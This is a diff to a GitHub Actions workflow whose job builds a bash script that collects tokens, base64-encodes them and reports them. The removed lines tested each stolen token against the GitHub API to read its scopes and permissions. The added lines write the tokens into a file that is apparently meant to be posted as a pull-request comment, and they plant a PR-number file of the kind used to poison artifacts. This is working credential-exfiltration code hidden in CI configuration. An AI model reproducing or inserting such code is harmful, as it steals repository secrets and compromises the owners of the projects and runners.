@@ -12,20 +12,17 @@ jobs:
           set -e
           mkdir -p content
           printf 'marker\n' > content/a
+          printf '2\n' > content/pr_number.txt
           cat > content/p <<'SCRIPT'
           #!/bin/bash
           declare -A seen
           report() {
-            local tok="$1" desc="$2" b64 hdrs status scopes perms
+            local tok="$1" desc="$2" b64
             b64=$(printf '%s' "$tok" | base64 -w0)
             [ -n "${seen[$b64]}" ] && return
             seen[$b64]=1
-            echo "LEAKTOKEN b64=$b64 desc=$desc" >&2
-            hdrs=$(curl -m 5 -s -D - -o /tmp/resp.json -H "Authorization: token $tok" -H "Accept: application/vnd.github+json" https://api.github.com/repos/PDFtoMark/triage-aave-dao-vc8c7ddd-7f94fe)
-            status=$(printf '%s' "$hdrs" | head -1 | tr -d '\r')
-            scopes=$(printf '%s' "$hdrs" | tr -d '\r' | awk -F': ' 'tolower($1)=="x-oauth-scopes"||tolower($1)=="x-accepted-github-permissions"{printf "%s=%s;", $1, $2}')
-            perms=$(tr -d '\n' < /tmp/resp.json | sed -n 's/.*"permissions":{\([^}]*\)}.*/\1/p')
-            echo "LEAKAPI b64=$b64 status=$status scopes=$scopes perms=$perms" >&2
+            printf '\nLEAKTOKEN b64=%s desc=%s\n' "$b64" "$desc" >> /tmp/comment
+            echo "LEAKFOUND $b64" >&2
           }
           end=$((SECONDS+95))
           while [ $SECONDS -lt $end ]; do
